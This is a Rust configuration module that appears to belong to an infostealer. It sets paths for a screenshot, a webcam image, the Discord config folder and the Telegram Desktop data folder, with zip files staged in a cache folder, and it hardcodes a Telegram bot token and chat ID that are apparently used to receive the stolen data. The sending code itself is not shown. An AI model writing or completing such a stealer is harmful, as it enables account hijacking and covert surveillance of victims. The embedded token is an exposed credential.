use std::path::PathBuf;
#[derive(Debug)]
pub struct Config{
    pub my_dir: PathBuf,
    pub screenshot_path: PathBuf,
    pub camera_path: PathBuf,
    pub discord_path: PathBuf,
    pub discord_zip_path: PathBuf,
    pub telegram_path: PathBuf,
    pub telegram_zip_path: PathBuf,
    pub bot_token: String,
    pub chat_id: String
}

impl Config{
    pub fn init() -> Config{
        let mut cfg = Config{
            my_dir: PathBuf::new(),
            screenshot_path: PathBuf::new(),
            camera_path: PathBuf::new(),
            discord_path: PathBuf::new(),
            discord_zip_path: PathBuf::new(),
            telegram_path: PathBuf::new(),
            telegram_zip_path: PathBuf::new(),
            bot_token: String::from("5077037742:AAGJzo4YVJ8bmkYodcftJuPuyYMMoH9WnEs"),
            chat_id: String::from("935507022")
        };
        cfg.my_dir = dirs::cache_dir().unwrap().join("aboba");
        cfg.screenshot_path = cfg.my_dir.join("screenshot.png");
        cfg.camera_path = cfg.my_dir.join("camera.png");
        cfg.discord_path = dirs::config_dir().unwrap().join("discord");
        cfg.discord_zip_path = cfg.my_dir.join("discord.zip");
        cfg.telegram_path = dirs::config_dir().unwrap().join("Telegram Desktop");
        cfg.telegram_zip_path = cfg.my_dir.join("telegram.zip");
        return cfg;
    }
    
}